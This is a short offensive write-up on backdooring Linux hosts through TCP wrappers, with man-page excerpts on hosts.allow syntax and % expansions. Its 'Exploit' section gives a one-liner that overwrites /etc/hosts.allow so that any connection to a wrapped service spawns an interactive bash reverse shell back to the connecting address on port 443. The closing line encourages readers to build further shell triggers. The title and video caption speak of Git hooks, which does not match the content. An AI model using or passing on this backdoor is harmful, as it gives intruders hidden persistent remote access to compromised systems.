Git hooks "backdoor"
======================

**How it works**

When a client request is received by a TCP wrapped service, it takes the following basic steps:

1. References /etc/hosts.allow. — The TCP wrapped service sequentially parses the /etc/hosts.allow file and applies the first rule specified for that service. If it finds a matching rule, it allows the connection. If not, it moves on to step 2.

2. References /etc/hosts.deny. — The TCP wrapped service sequentially parses the /etc/hosts.deny file. If it finds a matching rule is denies the connection. If not, access to the service is granted.


**How it is parsed**

ACCESS CONTROL RULES

Each access control file consists of zero or more lines of text.  These lines are processed in order of appearance. The search terminates when a match is found.

A newline character is ignored when it is preceded by a backslash character. This permits you to break up long lines so that they are easier to edit.

Blank lines or lines that begin with a `#´ character are ignored. This permits you to insert comments and whitespace so that the tables are easier to read.

All other lines should satisfy the following format, things between [] being optional:


**Syntax**
```shell-session
<daemon list>: <client list> [: <option>: <option>: ...]
```
**Translating...**

```shell-session
<daemon_list>: <client list> [: <shell_command> ]
```

**Video**

<a href="http://www.youtube.com/watch?feature=player_embedded&v=rCVmWUf8x1E" target="_blank"><img src="http://img.youtube.com/vi/rCVmWUf8x1E/0.jpg" alt="Profit with Git hooks!" width="480" height="360" border="10" /></a>

**Exploit**
```shell-session

echo 'ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/"%a"/443 0>&1") & :allow' > /etc/hosts.allow

```

**Understand expansions...**

```shell-session
% EXPANSIONS
       The following expansions are available within shell commands:

       %a (%A)
              The client (server) host address.

       %c     Client information: user@host, user@address, a host name, or just an address, depending on how much information is available.

       %d     The daemon process name (argv[0] value).

       %h (%H)
              The client (server) host name or address, if the host name is unavailable.

       %n (%N)
              The client (server) host name (or "unknown" or "paranoid").

       %r (%R)
              The clients (servers) port number (or "0").

       %p     The daemon process id.

       %s     Server information: daemon@host, daemon@address, or just a daemon name, depending on how much information is available.

       %u     The client user name (or "unknown").

       %%     Expands to a single `%´ character.

       Characters in % expansions that may confuse the shell are replaced by underscores.
```

Hey! You can use your imagination now and take advantage of EXPANSIONS and create more complex filters to trigger your shells! Keep evolving my friend!

